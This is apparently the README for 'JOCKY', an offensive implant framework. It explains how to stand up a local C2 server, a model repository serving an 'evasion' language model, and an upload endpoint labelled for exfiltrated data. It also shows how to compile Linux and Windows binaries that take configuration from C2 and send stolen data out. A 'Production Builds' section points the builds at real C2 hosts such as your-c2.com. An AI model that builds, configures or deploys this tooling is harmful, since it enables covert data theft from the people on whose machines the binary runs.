# JOCKY Local Development Environment

Complete Docker-based setup for local development with C2 server, model repository, and CDN endpoint.

## Quick Start

```bash
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux
```

Docker services start automatically, environment variables are set, and the binary is compiled with embedded local configuration.

## Prerequisites

```bash
docker --version          # Verify Docker is installed
docker-compose --version  # Verify Docker Compose is installed
```

## What Gets Set Up

| Service | Port | Purpose |
|---------|------|---------|
| **C2 Server** | 5000 | Configuration endpoint |
| **Model Repo** | 5001 | ML model hosting |
| **CDN Endpoint** | 5080 | Data exfiltration |

## Environment Variables (Auto-Set)

- `JOCKY_C2_PRIMARY=http://localhost:5000/api/config`
- `JOCKY_C2_FALLBACK=http://localhost:5000/api/config`
- `JOCKY_MODEL_REPO=http://localhost:5001/models/`
- `JOCKY_BUILD_ID=local_dev_[timestamp]`

These are embedded in the binary at compile time.

## Usage

### Linux Build

```bash
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux
```

### Windows Build

```bash
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform windows
```

### Custom Script

```bash
./scripts/build_local.sh examples/your_script.jky build/custom --platform linux
```

## Viewing Logs

```bash
# C2 Server
docker-compose -f docker-compose.dev.yml logs c2-server

# Follow in real-time
docker-compose -f docker-compose.dev.yml logs -f c2-server

# All services
docker-compose -f docker-compose.dev.yml logs
```

## Exfiltrated Data

Files uploaded to the CDN appear in `build/uploads/`:

```bash
ls -lah build/uploads/
cat build/uploads/data.txt
```

## Stopping Services

```bash
docker-compose -f docker-compose.dev.yml down
```

## Testing Services

### Test C2 Configuration

```bash
curl http://localhost:5000/api/config | jq
```

### Test Model Repository

```bash
curl http://localhost:5001/
```

### Test CDN Upload

```bash
echo "test" > /tmp/test.txt
curl -X POST -F "file=@/tmp/test.txt" http://localhost:5080/upload
ls build/uploads/
```

## Adding ML Models

```bash
# Download model (e.g., Phi-3 from HuggingFace)
# Copy to models directory
cp phi3_evasion_linux.gguf models/

# When you build, binary can download it
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local
```

## Troubleshooting

### Docker Not Running

```bash
# Linux
sudo systemctl start docker

# Mac
open -a Docker

# Windows
# Open Docker Desktop
```

### Port Already in Use

```bash
lsof -i :5000
lsof -i :5001
lsof -i :5080

# Kill process or modify docker-compose.dev.yml
```

### Services Won't Start

```bash
docker-compose -f docker-compose.dev.yml pull
docker-compose -f docker-compose.dev.yml restart
```

### C2 Server Fails

```bash
docker-compose -f docker-compose.dev.yml logs c2-server
docker-compose -f docker-compose.dev.yml exec c2-server pip install flask
```

## File Structure

```
JOCKY/
├── docker-compose.dev.yml        # Service definitions
├── scripts/
│   ├── build_local.sh            # Build wrapper
│   ├── c2_server.py              # C2 server
│   ├── Caddyfile.models          # Model repo config
│   └── Caddyfile.cdn             # CDN config
├── models/                        # ML models
├── build/
│   ├── local/                    # Output binaries
│   └── uploads/                  # Exfiltrated data
└── examples/
    └── research_chain_linux_production.jky
```

## Architecture

```
Host Machine (Docker)
│
├── C2 Server (port 5000)
│   └── /api/config - Returns CDN endpoint, tokens, model URLs
│
├── Model Repository (port 5001)
│   └── /models/ - Hosts ML models
│
├── CDN Endpoint (port 5080)
│   └── /upload - Receives exfiltrated data
│
└── Compiled Binary
    ├── Contains hardcoded localhost URLs
    ├── Fetches config from C2 at runtime
    ├── Downloads model if missing
    └── Exfiltrates data to CDN
```

## Production Builds

For production deployments with real C2 servers:

```bash
export JOCKY_C2_PRIMARY="https://your-c2.com/api/config"
export JOCKY_C2_FALLBACK="https://backup-c2.com/api/config"
export JOCKY_MODEL_REPO="https://your-models.com/models/"
export JOCKY_BUILD_ID="production_linux_001"

./scripts/build_with_config.sh examples/research_chain_linux_production.jky build/prod
```

## Performance

- First build: ~30-60 seconds (pulls Docker images)
- Subsequent builds: ~10-20 seconds (services running)
- Disk space: ~1 GB for images
- RAM: ~500 MB for services

## Security Note

⚠️ This is for **LOCAL DEVELOPMENT ONLY**

- No authentication
- HTTP only (no HTTPS)
- All URLs point to localhost
- Never use in production

For production, use real HTTPS endpoints and authentication.
